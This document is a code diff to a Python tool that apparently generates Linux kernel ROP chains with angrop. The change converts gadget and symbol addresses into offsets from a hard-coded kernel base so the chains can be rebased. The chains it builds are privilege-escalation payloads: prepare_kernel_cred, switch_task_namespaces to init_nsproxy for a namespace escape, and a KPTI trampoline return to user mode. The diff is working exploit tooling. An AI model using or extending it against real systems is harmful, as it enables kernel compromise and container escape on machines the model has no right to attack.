@@ -26,6 +26,8 @@ FORK = "__do_sys_vfork"
 ROP_C_FORMAT = "*(rop++) = {};"
 ROP_REBASE_C_FORMAT = "*(rop++) = kbase + {};"
 
+KERNEL_BASE_ADDRESS = 0xffffffff81000000
+
 
 class RopGeneratorError(Exception):
     """Exception class for RopGenerator errors."""
@@ -63,7 +65,7 @@ class RopGeneratorAngrop:
         return self._symbol_map.get(func_name)
 
     def _find_symbol(self, func_name):
-        return RopChainOffset(self._find_symbol_addr(func_name))
+        return RopChainOffset(self._find_symbol_addr(func_name) - KERNEL_BASE_ADDRESS)
 
     def _find_symbol_name(self, addr):
         return self._addr_to_symbol.get(addr)
@@ -98,7 +100,7 @@ class RopGeneratorAngrop:
                     shortest_gadget = gadget
 
         if shortest_gadget:
-            return shortest_gadget
+            return shortest_gadget.addr - KERNEL_BASE_ADDRESS
         else:
             raise RopGeneratorError(
                 f"No pop gadget found for the register {reg_name}"
@@ -109,7 +111,7 @@ class RopGeneratorAngrop:
         items = []
         for value, rebased in chain_mov_regs._concretize_chain_values():  # pylint: disable=protected-access
             if rebased:
-                items.append(RopChainOffset(value))
+                items.append(RopChainOffset(value - KERNEL_BASE_ADDRESS))
             else:
                 items.append(RopChainConstant(value))
 
@@ -136,7 +138,7 @@ class RopGeneratorAngrop:
                         shortest_gadget = gadget
 
         if shortest_gadget:
-            return shortest_gadget
+            return shortest_gadget.addr - KERNEL_BASE_ADDRESS
         else:
             raise RopGeneratorError("No suitable memory writes found")
 
@@ -259,7 +261,7 @@ class RopGeneratorAngrop:
             RopChain: The constructed ROP chain to execute the `msleep` function.
         """
         return RopChain([
-            RopChainOffset(self._find_pop_one_reg("rdi").addr),
+            RopChainOffset(self._find_pop_one_reg("rdi")),
             msecs,
             self._find_symbol(MSLEEP),
         ])
@@ -271,7 +273,7 @@ class RopGeneratorAngrop:
             RopChain: The constructed ROP chain.
         """
         items = [
-            RopChainOffset(self._find_pop_one_reg("rdi").addr),
+            RopChainOffset(self._find_pop_one_reg("rdi")),
             0,
             self._find_symbol(PREPARE_KERNEL_CRED),
         ]
@@ -288,14 +290,14 @@ class RopGeneratorAngrop:
             RopChain: The constructed ROP chain.
         """
         items = [
-            RopChainOffset(self._find_pop_one_reg("rdi").addr),
+            RopChainOffset(self._find_pop_one_reg("rdi")),
             1,
             self._find_symbol(FIND_TASK_BY_VPID),
         ]
 
         items.extend(self._mov_reg_rax("rdi"))
         items.extend([
-            RopChainOffset(self._find_pop_one_reg("rsi").addr),
+            RopChainOffset(self._find_pop_one_reg("rsi")),
             self._find_symbol(INIT_NSPROXY),
         ])
         items.append(self._find_symbol(SWITCH_TASK_NAMESPACES))
@@ -316,7 +318,7 @@ class RopGeneratorAngrop:
             RopChain: The constructed ROP chain.
         """
         return RopChain([
-            RopChainOffset(self._kpti_trampoline),
+            RopChainOffset(self._kpti_trampoline - KERNEL_BASE_ADDRESS),
             RopChainConstant(0),
             RopChainConstant(0),
             user_rip,
